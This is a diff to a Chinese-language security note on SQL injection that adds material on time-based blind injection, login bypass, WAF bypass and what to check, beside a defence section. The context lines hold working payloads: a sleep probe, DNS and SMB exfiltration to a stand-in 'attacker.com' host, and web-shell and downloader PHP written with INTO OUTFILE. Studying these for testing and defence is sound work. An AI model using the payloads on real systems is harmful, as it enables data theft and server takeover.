@@ -15,7 +15,7 @@ SQL注入漏洞(SQL injection) - 对用户请求中的输入的参数值过滤�
 
 （以时间型盲注为例）
 
-**时间型盲注(Time-Based Blind SQL Injection Attacks)**：可根据不同响应时间确定是否存在SQL注入漏洞
+**时间型盲注(Time-Based Blind SQL Injection Attacks)**：利用能够"延时"的函数构造SQL语句 然后根据响应时长(响应时间间隔的数值大小)进行判断
 
 * Test case
   * 如对某个使用MySQL数据库的WEB系统测试时发送的请求含payload `(select*from(select(sleep(20)))a)` 得到response的时间为20秒
@@ -54,6 +54,8 @@ test.get_content() #获取第一列第一个字段内容
     * MySQL `SELECT LOAD_FILE(CONCAT('\\\\foo.',(select MID(version(),1,1)),'.attacker.com\\abc'));`
   * SMB Requests - `INTO OUTFILE`可以发出SMB请求
     * MySQL `' OR 1=1 INTO OUTFILE '\\\\attacker\\SMBshare\\output.txt`
+* 绕过判断
+  * Auth Bypass:如web登录功能存在SQLi 使用"万能密码"实现Login Bypass
 * 文件读写 - 前提:当前数据库user有FILE权限
   * 读取文件(Reading Files)
     * MySQL - `LOAD_FILE()`
@@ -63,16 +65,21 @@ test.get_content() #获取第一列第一个字段内容
     * 例1 Get WebShell `SELECT '<? system($_GET[\'c\']); ?>' INTO OUTFILE '/var/www/shell.php';` 访问WebShell `http://localhost/shell.php?c=cat%20/etc/passwd`
     * 例2 Downloader `SELECT '<? fwrite(fopen($_GET[f], \'w\'), file_get_contents($_GET[u])); ?>' INTO OUTFILE '/var/www/get.php'` 访问 `http://localhost/get.php?f=shell.php&u=http://localhost/c99.txt`
 
+### SQLi - BypassWAF
+
+* 用注释分割关键字
+* HTTP参数污染(HTTP Parameter Pollution)
+* ...
+
+### 重点检测
+
+* 无法使用"预编译语句"的情况
+  * `order by`
+  * `limit`
+* 宽字节注入
+* ...
 
 ### SDL - 防御与修复方案
-
-* 重点检测
-  * 无法使用"预编译语句"的情况
-    * `order by`
-    * `limit`
-  * 宽字节注入
-  * ...
-  
 
 * 1.使用带有"参数化查询"的"预编译语句"
 
